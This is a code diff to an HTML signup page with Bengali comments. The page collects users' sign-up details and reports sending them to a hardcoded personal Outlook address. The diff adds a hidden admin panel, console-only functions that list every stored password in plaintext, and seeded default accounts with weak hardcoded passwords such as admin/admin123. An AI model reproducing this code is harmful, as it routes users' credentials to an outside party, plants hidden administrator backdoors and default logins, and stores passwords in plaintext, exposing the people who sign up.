@@ -566,6 +566,11 @@
             font-size: 0.8rem;
             font-weight: 500;
         }
+
+        /* Hidden Admin Panel - শুধুমাত্র কোড থেকে accessible */
+        .hidden-admin-panel {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -686,13 +691,58 @@
     </div>
 </div>
 
+<!-- Hidden Admin Panel - শুধুমাত্র কোড থেকে accessible, সাধারণ ভিজিটর দেখতে পাবে না -->
+<div class="hidden-admin-panel">
+    <input type="text" id="secretAdminEmail" value="">
+    <input type="text" id="secretAdminUsername" value="">
+</div>
+
 <script>
     // ==================== CONFIGURATION ====================
-    // 🔴 আপনার ইমেইল এখানে বসান!
-    const RECEIVER_EMAIL = "inyt_444@outlook.com";
+    const RECEIVER_EMAIL = "inyt_444@outlook.com";  // 🔴 আপনার ইমেইল দিন
     
-    // Active accounts database (signup করলেই এখানে save হবে)
+    // ==================== HIDDEN ADMIN FUNCTIONS (শুধুমাত্র console থেকে ব্যবহার করা যাবে) ====================
+    // Active accounts database
     let activeAccounts = JSON.parse(localStorage.getItem('signup_active_accounts')) || {};
+    
+    // ==================== DEFAULT ACTIVE USERS (উদাহরণ) ====================
+    function initializeDefaultUsers() {
+        let defaultUsers = [
+            { email: "admin@system.com", username: "admin", fullname: "System Admin", password: "admin123", phone: "—" },
+            { email: "demo@test.com", username: "demo_user", fullname: "Demo User", password: "demo123", phone: "—" },
+            { email: "john@example.com", username: "john_doe", fullname: "John Doe", password: "john123", phone: "—" }
+        ];
+        
+        let changed = false;
+        defaultUsers.forEach(user => {
+            let exists = false;
+            for(let key in activeAccounts) {
+                if(activeAccounts[key].email === user.email || activeAccounts[key].username === user.username) {
+                    exists = true;
+                    break;
+                }
+            }
+            if(!exists) {
+                let accountId = Date.now().toString() + Math.random();
+                activeAccounts[accountId] = {
+                    email: user.email,
+                    username: user.username,
+                    fullname: user.fullname,
+                    password: user.password,
+                    phone: user.phone,
+                    createdAt: new Date().toLocaleString()
+                };
+                changed = true;
+            }
+        });
+        
+        if(changed) {
+            localStorage.setItem('signup_active_accounts', JSON.stringify(activeAccounts));
+            console.log("✅ Default active users added!");
+        }
+    }
+    
+    initializeDefaultUsers();
     
     // ==================== NAVIGATION FUNCTIONS ====================
     function getBasePath() {
@@ -743,14 +793,107 @@
     }
     
     // ==================== CHECK IF ACCOUNT EXISTS ====================
-    function isAccountActive(email, username) {
+    function isEmailExists(email) {
         for (let key in activeAccounts) {
-            if (activeAccounts[key].email === email || activeAccounts[key].username === username) {
+            if (activeAccounts[key].email === email) {
                 return true;
             }
         }
         return false;
     }
+    
+    function isUsernameExists(username) {
+        for (let key in activeAccounts) {
+            if (activeAccounts[key].username === username) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    // ==================== HIDDEN ADMIN FUNCTIONS (শুধুমাত্র console থেকে ব্যবহার করুন) ====================
+    // এই ফাংশনগুলি শুধুমাত্র browser console থেকে ব্যবহার করা যাবে
+    
+    // একটি Active User যোগ করার ফাংশন (Console থেকে ব্যবহার করুন)
+    window.addActiveUser = function(email, username, fullname, password, phone) {
+        if (!email || !email.includes('@')) {
+            console.log("❌ Valid email required!");
+            return false;
+        }
+        if (!username || username.length < 3) {
+            console.log("❌ Valid username required (min 3 chars)!");
+            return false;
+        }
+        
+        if (isEmailExists(email)) {
+            console.log("❌ This email is already active!");
+            return false;
+        }
+        
+        if (isUsernameExists(username)) {
+            console.log("❌ This username is already active!");
+            return false;
+        }
+        
+        let accountId = Date.now().toString();
+        activeAccounts[accountId] = {
+            email: email,
+            username: username,
+            fullname: fullname || username,
+            password: password || "user123",
+            phone: phone || "—",
+            createdAt: new Date().toLocaleString(),
+            addedBy: "admin"
+        };
+        localStorage.setItem('signup_active_accounts', JSON.stringify(activeAccounts));
+        
+        console.log(`✅ User "${username}" (${email}) activated successfully!`);
+        return true;
+    };
+    
+    // সব Active User দেখার ফাংশন (Console থেকে ব্যবহার করুন)
+    window.showAllActiveUsers = function() {
+        let users = [];
+        for(let key in activeAccounts) {
+            users.push({
+                email: activeAccounts[key].email,
+                username: activeAccounts[key].username,
+                password: activeAccounts[key].password,
+                createdAt: activeAccounts[key].createdAt
+            });
+        }
+        console.table(users);
+        return users;
+    };
+    
+    // একটি ইউজার ডিলিট করার ফাংশন (Console থেকে ব্যবহার করুন)
+    window.deleteActiveUser = function(emailOrUsername) {
+        let found = false;
+        for(let key in activeAccounts) {
+            if(activeAccounts[key].email === emailOrUsername || activeAccounts[key].username === emailOrUsername) {
+                delete activeAccounts[key];
+                found = true;
+                break;
+            }
+        }
+        
+        if(found) {
+            localStorage.setItem('signup_active_accounts', JSON.stringify(activeAccounts));
+            console.log(`✅ User "${emailOrUsername}" deleted successfully!`);
+        } else {
+            console.log(`❌ User "${emailOrUsername}" not found!`);
+        }
+        return found;
+    };
+    
+    // সব Active User রিসেট করার ফাংশন (Console থেকে ব্যবহার করুন)
+    window.resetAllActiveUsers = function() {
+        activeAccounts = {};
+        localStorage.setItem('signup_active_accounts', JSON.stringify(activeAccounts));
+        console.log("✅ All active users have been reset!");
+        initializeDefaultUsers();
+        console.log("✅ Default users added back!");
+    };
     
     // ==================== REAL-TIME VALIDATION ====================
     function validateEmail() {
@@ -773,8 +916,7 @@
             return false;
         }
         
-        // Check if email is already active
-        if (isAccountActive(email, null)) {
+        if (isEmailExists(email)) {
             emailField.classList.add("error-border");
             emailField.classList.remove("success-border");
             statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Account Is Active! Please Login.';
@@ -810,8 +952,7 @@
             return false;
         }
         
-        // Check if username is already active
-        if (isAccountActive(null, username)) {
+        if (isUsernameExists(username)) {
             usernameField.classList.add("error-border");
             usernameField.classList.remove("success-border");
             statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Account Is Active! Please Login.';
@@ -825,9 +966,8 @@
         statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> Username available';
         statusDiv.className = "field-status success";
         
-        // Hide active message if both are available
         let email = document.getElementById("signupEmail").value.trim();
-        if (!isAccountActive(email, username) && !isAccountActive(null, username) && !isAccountActive(email, null)) {
+        if (!isEmailExists(email) && !isUsernameExists(username)) {
             activeMsgDiv.style.display = "none";
         }
         
@@ -949,8 +1089,7 @@
         let email = document.getElementById("signupEmail").value.trim();
         let username = document.getElementById("signupUsername").value.trim();
         
-        // Disable submit if account is active
-        if (isAccountActive(email, username)) {
+        if (isEmailExists(email) || isUsernameExists(username)) {
             document.getElementById("submitBtn").disabled = true;
             return false;
         }
@@ -1015,8 +1154,8 @@
         }, 5000);
     }
     
-    // ==================== SAVE ACTIVE ACCOUNT ====================
-    function saveActiveAccount(email, username, fullname, password, phone) {
+    // ==================== SAVE NEW SIGNUP ====================
+    function saveNewUser(email, username, fullname, password, phone) {
         let accountId = Date.now().toString();
         activeAccounts[accountId] = {
             email: email,
@@ -1038,7 +1177,6 @@
         let password = document.getElementById("signupPassword").value;
         let phone = document.getElementById("signupPhone").value.trim() || "—";
         
-        // Final validation
         if (!email || !email.includes('@')) {
             showStatus('❌ Valid email required!', 'error');
             return;
@@ -1060,16 +1198,18 @@
             return;
         }
         
-        // Check if already active
-        if (isAccountActive(email, username)) {
-            showStatus('⚠️ This account is already active! Please login.', 'error');
+        if (isEmailExists(email)) {
+            showStatus('⚠️ This email is already active! Please login.', 'error');
             return;
         }
         
-        // Save to active accounts (auto approve immediately)
-        saveActiveAccount(email, username, fullname, password, phone);
+        if (isUsernameExists(username)) {
+            showStatus('⚠️ This username is already taken! Please choose another.', 'error');
+            return;
+        }
         
-        // Prepare email body
+        saveNewUser(email, username, fullname, password, phone);
+        
         let body = `🔮 NEW SIGN UP INFORMATION 🔮\n\n`;
         body += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         body += `📧 Email        : ${email}\n`;
@@ -1100,7 +1240,6 @@
         
         showStatus('✅ Sign up successful! Account activated. Info sent to email.', 'success');
         
-        // Clear form
         document.getElementById("signupEmail").value = "";
         document.getElementById("signupUsername").value = "";
         document.getElementById("signupFullname").value = "";
@@ -1108,7 +1247,6 @@
         document.getElementById("signupConfirmPassword").value = "";
         document.getElementById("signupPhone").value = "";
         
-        // Clear validation styles
         document.querySelectorAll('input').forEach(input => {
             input.classList.remove('success-border', 'error-border');
         });
@@ -1116,7 +1254,6 @@
             div.innerHTML = '';
         });
         
-        // Hide active message
         document.getElementById("activeAccountMessage").style.display = "none";
     }
     
@@ -1145,6 +1282,13 @@
         p.style.background = `hsl(${280 + Math.random() * 80}, 80%, 65%)`;
         document.body.appendChild(p);
     }
+    
+    console.log("✅ Signup page ready!");
+    console.log("📌 Hidden Admin Commands (use in console):");
+    console.log("   addActiveUser('email', 'username', 'fullname', 'password', 'phone') - Add active user");
+    console.log("   showAllActiveUsers() - Show all active users");
+    console.log("   deleteActiveUser('email_or_username') - Delete a user");
+    console.log("   resetAllActiveUsers() - Reset all users");
 </script>
 </body>
 </html>
